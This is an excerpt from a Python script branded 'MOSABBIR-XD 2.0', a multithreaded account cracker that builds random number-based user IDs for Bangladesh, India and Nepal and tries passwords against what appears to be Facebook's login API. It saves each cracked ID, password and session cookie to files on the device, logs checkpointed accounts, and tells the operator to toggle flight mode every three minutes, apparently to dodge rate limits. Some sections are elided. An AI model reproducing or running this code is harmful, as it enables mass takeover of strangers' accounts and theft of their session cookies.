...
logo = f"""
        {W}   __  __                 _     _     _      
        {W}  |  \/  |               | |   | |   (_)     
        {W}  | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
        {W}  | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
        {W}  | |  | | (_) \__ \ (_| | |_) | |_) | | |   
        {W}  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|    {G}2.0
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {xd} MOSABBIR-XD
...
def ___Bangladesh___():
	...
	for Kid in range(limit):MOSABBIRxd = ''.join(random.choice(string.digits) for _ in range(8));user.append(MOSABBIRxd)
...
def ___India___():
	...
	for Kid in range(limit):MOSABBIRxd = ''.join(random.choice(string.digits) for _ in range(7));user.append(MOSABBIRxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
...
def ___Nepal___():
	...
	for Kid in range(limit):MOSABBIRxd = ''.join(random.choice(string.digits) for _ in range(6));user.append(MOSABBIRxd)
	with tred(max_workers=30) as __ex__:
		clear();tl = str(len(user))
		print(f"{xd} SIM CODE {xd}{G} {code} {G}|{W} TOTAL UID {xd}{G} {limit}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
...
def ___XD___(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r{xd} MOSABBIR-XD {loop}{B}|{G}{len(ok)}{B}|{X}{len(cp)} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                ...
                                if "LIVE" in response:
                                	print(f'\r{xd}{G} MOSABBIR-OK {str(uid)} | {pas} | {coki} ');linex()
                                	open('/sdcard/MOSABBIR-RANDOM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	ok.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{xd}{X} MOSABBIR-CP {str(uid)} | {pas} ')
                                open('/sdcard/MOSABBIR-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
